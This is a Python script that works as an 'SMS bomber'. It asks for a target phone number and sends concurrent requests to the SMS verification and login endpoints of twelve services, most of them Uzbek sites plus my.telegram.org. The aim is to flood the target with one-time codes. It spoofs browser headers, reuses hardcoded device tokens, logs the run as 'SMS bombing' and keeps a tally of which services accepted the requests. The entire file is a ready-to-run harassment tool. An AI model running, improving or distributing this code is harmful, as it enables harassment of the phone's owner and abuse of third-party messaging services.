import requests
import time
import concurrent.futures
from typing import Dict, List, Optional
import logging
from dataclasses import dataclass
import json

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
logger = logging.getLogger(__name__)

@dataclass
class ServiceConfig:
    """Configuration for each service"""
    name: str
    url: str
    method: str
    headers: Dict[str, str]
    json_data: Optional[Dict] = None
    form_data: Optional[Dict] = None

class SMSSender:
    def __init__(self, phone_number: str, max_workers: int = 5):
        """
        Initialize SMS sender
        
        Args:
            phone_number: Phone number in international format (e.g., 998901234567)
            max_workers: Maximum number of concurrent requests
        """
        self.phone = phone_number
        self.max_workers = max_workers
        self.session = requests.Session()
        self.results = []
        
    def get_services(self) -> List[ServiceConfig]:
        """Define all services configuration"""
        services = []
        
        # 1. 100k.uz
        services.append(ServiceConfig(
            name='100k.uz',
            url='https://api.100k.uz/api/auth/sms-login',
            method='POST',
            json_data={'phone': f'+{self.phone}'},
            headers={
                'Authorization': 'Bearer null',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 11; Infinix X665B) AppleWebKit/537.36',
                'Origin': 'https://admin.100k.uz',
                'Referer': 'https://admin.100k.uz/',
                'Content-Type': 'application/json'
            }
        ))
        
        # 2. alifshop.uz
        services.append(ServiceConfig(
            name='alifshop.uz',
            url='https://gw.alifshop.uz/web/client/auth/request-login',
            method='POST',
            json_data={'phone': self.phone},
            headers={
                'Service-Token': 'service-token-alifshop',
                'Accept-Language': 'uz',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 11; Infinix X665B) AppleWebKit/537.36',
                'Origin': 'https://alifshop.uz',
                'Referer': 'https://alifshop.uz/',
                'Content-Type': 'application/json'
            }
        ))
        
        # 3. uybor.uz
        services.append(ServiceConfig(
            name='uybor.uz',
            url='https://api.uybor.uz/api/v1/auth/code',
            method='POST',
            json_data={'phone': f'+{self.phone}'},
            headers={
                'User-Agent': 'Mozilla/5.0 (Linux; Android 11; Infinix X665B) AppleWebKit/537.36',
                'Origin': 'https://uybor.uz',
                'Referer': 'https://uybor.uz/',
                'Content-Type': 'application/json'
            }
        ))
        
        # 4. bilgi.uz
        services.append(ServiceConfig(
            name='bilgi.uz',
            url='https://bilgi.uz/local/ajax/common.php',
            method='POST',
            form_data={
                'handler': 'AuthAjaxHandler',
                'func': 'sendRegisterFields',
                'phone': self.phone,
                'name': 'TestUser',
                'password': 'Test123456'
            },
            headers={
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'X-Requested-With': 'XMLHttpRequest',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 11; Infinix X665B) AppleWebKit/537.36',
                'Origin': 'https://bilgi.uz',
                'Referer': 'https://bilgi.uz/uz/auth/registration.php?type=register'
            }
        ))
        
        # 5. brandstore.uz
        services.append(ServiceConfig(
            name='brandstore.uz',
            url='https://api.brandstore.uz/api/auth/code/create/',
            method='POST',
            json_data={'phone': self.phone},
            headers={
                'Device-Token': '1ed14173-7869-4418-9449-2631599c2dd8',
                'Device-Type': 'web',
                'X-Localization': 'ru',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 11; Infinix X665B) AppleWebKit/537.36',
                'Origin': 'https://brandstore.uz',
                'Referer': 'https://brandstore.uz/',
                'Content-Type': 'application/json'
            }
        ))
        
        # 6. dafna.uz
        services.append(ServiceConfig(
            name='dafna.uz',
            url='https://dafna.uz/api/send-code',
            method='POST',
            json_data={'phone': self.phone},
            headers={
                'User-Agent': 'Mozilla/5.0 (Linux; Android 11; Infinix X665B) AppleWebKit/537.36',
                'Origin': 'https://dafna.uz',
                'Referer': 'https://dafna.uz/',
                'Content-Type': 'application/json'
            }
        ))
        
        # 7. multibank.uz
        services.append(ServiceConfig(
            name='multibank.uz',
            url='https://auth.multibank.uz/api/otp-by-phone',
            method='POST',
            json_data={'phone': self.phone},
            headers={
                'User-Agent': 'Mozilla/5.0 (Linux; Android 11; Infinix X665B) AppleWebKit/537.36',
                'Origin': 'https://id.multibank.uz',
                'Referer': 'https://id.multibank.uz/',
                'Content-Type': 'application/json'
            }
        ))
        
        # 8. openshop.uz
        services.append(ServiceConfig(
            name='openshop.uz',
            url='https://web.openshop.uz/api/v1/auth/login-phone',
            method='POST',
            json_data={'phone': self.phone},
            headers={
                'language': 'uz',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 11; Infinix X665B) AppleWebKit/537.36',
                'Origin': 'https://openshop.uz',
                'Referer': 'https://openshop.uz/',
                'Content-Type': 'application/json'
            }
        ))
        
        # 9. frame.uz
        services.append(ServiceConfig(
            name='frame.uz',
            url='https://api.frame.uz/auth/api/v1/authentications',
            method='POST',
            json_data={
                'type': 'login',
                'method': 'login',
                'value': f'+{self.phone}',
                'platform': 'web',
                'identifier': '3e21f668-2184-44c6-a1e6-a06dd964f474'
            },
            headers={
                'x-platform': 'web',
                'accept-language': 'uz',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 11; Infinix X665B) AppleWebKit/537.36',
                'Origin': 'https://frame.uz',
                'Referer': 'https://frame.uz/',
                'Content-Type': 'application/json'
            }
        ))
        
        # 10. oqtepalavash.uz
        services.append(ServiceConfig(
            name='oqtepalavash.uz',
            url='https://oqtepalavash.uz/api/sms/Send',
            method='POST',
            json_data={'phone': self.phone},
            headers={
                'User-Agent': 'Mozilla/5.0 (Linux; Android 11; Infinix X665B) AppleWebKit/537.36',
                'Origin': 'https://oqtepalavash.uz',
                'Referer': 'https://oqtepalavash.uz/',
                'Content-Type': 'application/json'
            }
        ))
        
        # 11. soff.uz
        services.append(ServiceConfig(
            name='soff.uz',
            url='https://api.soff.uz/auth/register/',
            method='POST',
            json_data={
                'phone_or_email': f'+{self.phone}',
                'role': 'customer'
            },
            headers={
                'User-Agent': 'Mozilla/5.0 (Linux; Android 11; Infinix X665B) AppleWebKit/537.36',
                'Origin': 'https://soff.uz',
                'Referer': 'https://soff.uz/',
                'Content-Type': 'application/json'
            }
        ))
        
        # 12. my.telegram.org
        services.append(ServiceConfig(
            name='my.telegram.org',
            url='https://my.telegram.org/auth/send_password',
            method='POST',
            form_data={'phone': self.phone},
            headers={
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            }
        ))
        
        return services
    
    def send_request(self, service: ServiceConfig) -> Dict:
        """Send request to a single service"""
        try:
            start_time = time.time()
            
            if service.method.upper() == 'POST':
                if service.json_data:
                    response = self.session.post(
                        service.url,
                        json=service.json_data,
                        headers=service.headers,
                        timeout=10
                    )
                elif service.form_data:
                    response = self.session.post(
                        service.url,
                        data=service.form_data,
                        headers=service.headers,
                        timeout=10
                    )
                else:
                    response = self.session.post(
                        service.url,
                        headers=service.headers,
                        timeout=10
                    )
            else:
                response = self.session.get(
                    service.url,
                    headers=service.headers,
                    timeout=10
                )
            
            elapsed = time.time() - start_time
            
            result = {
                'service': service.name,
                'status_code': response.status_code,
                'success': 200 <= response.status_code < 300,
                'response_time': round(elapsed, 2),
                'response': response.text[:200]  # First 200 chars of response
            }
            
            logger.info(f"{service.name}: {response.status_code} ({elapsed:.2f}s)")
            
            if not result['success']:
                logger.warning(f"  ↳ Failed: {response.text[:100]}")
            
            return result
            
        except requests.exceptions.Timeout:
            logger.error(f"{service.name}: Timeout")
            return {
                'service': service.name,
                'success': False,
                'error': 'Timeout',
                'status_code': None
            }
        except requests.exceptions.ConnectionError:
            logger.error(f"{service.name}: Connection error")
            return {
                'service': service.name,
                'success': False,
                'error': 'Connection error',
                'status_code': None
            }
        except Exception as e:
            logger.error(f"{service.name}: {str(e)}")
            return {
                'service': service.name,
                'success': False,
                'error': str(e),
                'status_code': None
            }
    
    def send_all(self) -> List[Dict]:
        """Send requests to all services concurrently"""
        services = self.get_services()
        
        logger.info(f"Starting SMS bombing to {len(services)} services for phone: {self.phone}")
        logger.info("=" * 60)
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            future_to_service = {
                executor.submit(self.send_request, service): service 
                for service in services
            }
            
            for future in concurrent.futures.as_completed(future_to_service):
                service = future_to_service[future]
                try:
                    result = future.result()
                    self.results.append(result)
                except Exception as e:
                    logger.error(f"Error processing {service.name}: {e}")
                    self.results.append({
                        'service': service.name,
                        'success': False,
                        'error': str(e)
                    })
        
        return self.results
    
    def print_summary(self):
        """Print summary of all requests"""
        successful = [r for r in self.results if r.get('success')]
        failed = [r for r in self.results if not r.get('success')]
        
        logger.info("=" * 60)
        logger.info(f"SUMMARY for {self.phone}")
        logger.info(f"Total: {len(self.results)} | Successful: {len(successful)} | Failed: {len(failed)}")
        
        if successful:
            logger.info("\n✅ Successful services:")
            for r in successful:
                logger.info(f"  • {r['service']} ({r['status_code']}) - {r['response_time']}s")
        
        if failed:
            logger.info("\n❌ Failed services:")
            for r in failed:
                error = r.get('error', r.get('response', 'Unknown error'))[:50]
                logger.info(f"  • {r['service']}: {error}")
    
    def save_results(self, filename: str = None):
        """Save results to JSON file"""
        if filename is None:
            filename = f"sms_results_{self.phone}_{int(time.time())}.json"
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump({
                'phone': self.phone,
                'timestamp': time.time(),
                'results': self.results,
                'summary': {
                    'total': len(self.results),
                    'successful': len([r for r in self.results if r.get('success')]),
                    'failed': len([r for r in self.results if not r.get('success')])
                }
            }, f, indent=2, ensure_ascii=False)
        
        logger.info(f"Results saved to {filename}")

def main():
    """Main function"""
    # Get phone number from user
    phone = input("Enter phone number (e.g., 998901234567): ").strip()
    
    # Validate phone number
    if not phone.isdigit() or len(phone) < 10:
        print("❌ Invalid phone number. Please enter digits only (minimum 10 digits)")
        return
    
    # Ask for delay between requests
    try:
        workers = int(input("Number of concurrent requests (default 5): ") or "5")
    except ValueError:
        workers = 5
    
    # Create sender and send SMS
    sender = SMSSender(phone, max_workers=workers)
    
    try:
        # Send requests
        sender.send_all()
        
        # Print summary
        sender.print_summary()
        
        # Save results
        save = input("\nSave results to file? (y/n): ").lower()
        if save == 'y':
            sender.save_results()
            
    except KeyboardInterrupt:
        logger.info("\n⚠️ Process interrupted by user")
    except Exception as e:
        logger.error(f"Unexpected error: {e}")

if __name__ == "__main__":
    print("""
    ╔══════════════════════════════════════╗
    ║     SMS Sender for Uzbek Services    ║
    ║           (12 Services)              ║
    ╚══════════════════════════════════════╝
    """)
    main()